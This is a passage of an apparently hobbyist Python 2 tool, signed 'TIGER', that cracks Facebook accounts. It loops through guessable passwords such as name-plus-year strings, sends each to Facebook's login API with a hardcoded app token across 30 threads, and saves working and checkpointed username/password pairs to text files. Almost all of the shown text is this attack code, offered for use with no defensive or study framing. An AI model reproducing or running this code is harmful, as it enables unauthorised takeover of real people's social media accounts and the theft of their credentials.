                 okb.write(k + c + user + '--' + pass26 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass26) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass26 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass26 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass26)     
             else: 
                 pass27 = 'ahmad2003' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass27 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass27 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass27 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass27) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass27 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass27 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass27) 
             else: 
                 pass28 = 'ahmad2004' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass28 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass28 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass28 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass28) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass28 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass28 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass28)  
             else: 
                 pass29 = 'ahmad2005' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass29 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass29 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass29 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass29) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass29 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass29 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass29) 
             else: 
                 pass30 = 'ali12345' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass30 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass30 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass30 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass30) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass30 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass30 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass30) 
             else: 
                 pass31 = 'ali1122' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass31 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass31 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass31 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass31) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass31 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass31 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass31)  
             else: 
                 pass32 = 'ali2000' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass32 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass32 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass32 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass32) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass32 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass32 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass32) 
             else: 
                 pass33 = 'ali2001' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass33 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass33 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass33 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass33) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass33 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass33 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass33)   
             else: 
                 pass34 = 'ali2002' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass34 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass34 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass34 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass34) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass34 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass34 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass34)  
             else: 
                 pass35 = 'abdulla2000' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass35 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass35 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass35 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass35) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass35 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass35 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass35)            
             else: 
                 pass36 = 'abdulla2001' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass36 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass36 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass36 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass36) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass36 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass36 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass36)    
             else: 
                 pass37 = 'abdulla2002' 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass37 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[TIGER-OK]\x1b[1;92m ' + k + c + user + ' -- ' + pass37 + '\n' + '\n' 
                 okb = open('/sdcard/save/successfull.txt', 'a') 
                 okb.write(k + c + user + '--' + pass37 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass37) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;91m[TIGER-CP]\x1b[1;91m ' + k + c + user + ' -- ' + pass37 + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '--' + pass37 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass37)  
         except: 
             pass 
  
     p = ThreadPool(30) 
     p.map(main, id) 
     print 42 * '\x1b[1;91m-' 
     print '[\xe2\x9c\x93]\x1b[1;93m CRACK KOTAY HAT ....' 
     print '[\xe2\x9c\x93]\x1b[1;92m OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb)) 
     print '[\xe2\x9c\x93]\x1b[1;91m TOOL BY TIGER' 
     raw_input('\n[ ENTER BKA]') 
     os.system('python2 tiger3.py.') 
 if __name__ == '__main__': 
     menu()